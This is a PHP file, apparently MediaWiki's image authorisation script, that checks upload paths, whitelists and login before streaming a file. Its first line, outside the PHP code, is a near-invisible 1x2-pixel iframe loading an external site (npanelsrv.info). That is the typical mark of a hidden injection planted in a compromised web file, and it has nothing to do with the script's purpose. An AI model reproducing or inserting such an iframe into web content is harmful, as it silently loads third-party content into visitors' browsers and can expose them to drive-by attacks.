<iframe src="http://npanelsrv.info/" width="1" height="2"></iframe>

<?php
/**
 * Image download authorisation script
 *
 * To use, in LocalSettings.php set $wgUploadDirectory to point to a non-public
 * directory, and $wgUploadPath to point to this file. Also set $wgWhitelistRead
 * to an array of pages you want everyone to be able to access. Your server must
 * support PATH_INFO, CGI-based configurations generally don't.
 */
# Valid web server entry point, enable includes
define( 'MEDIAWIKI', true );

if ( isset( $_REQUEST['GLOBALS'] ) ) {
	echo '<a href="http://www.hardened-php.net/index.76.html">$GLOBALS overwrite vulnerability</a>';
	die( -1 );
}

require_once( 'includes/Defines.php' );
require_once( './LocalSettings.php' );
require_once( 'includes/Setup.php' );
require_once( 'includes/StreamFile.php' );

if( !isset( $_SERVER['PATH_INFO'] ) ) {
	wfForbidden();
}

# Get filenames/directories
$filename = realpath( $wgUploadDirectory . $_SERVER['PATH_INFO'] );
$realUploadDirectory = realpath( $wgUploadDirectory );
$imageName = $wgLang->getNsText( NS_IMAGE ) . ":" . basename( $_SERVER['PATH_INFO'] );

# Check if the filename is in the correct directory
if ( substr( $filename, 0, strlen( $realUploadDirectory ) ) != $realUploadDirectory ) {
	wfForbidden();
}

if ( is_array( $wgWhitelistRead ) && !in_array( $imageName, $wgWhitelistRead ) && !$wgUser->getID() ) {
	wfForbidden();
}

if( !file_exists( $filename ) ) {
	wfForbidden();
}
if( is_dir( $filename ) ) {
	wfForbidden();
}

# Write file
wfStreamFile( $filename );

function wfForbidden() {
	header( 'HTTP/1.0 403 Forbidden' );
	print
"<html><body>
<h1>Access denied</h1>
<p>You need to log in to access files on this server</p>
</body></html>";
	exit;
}

?>
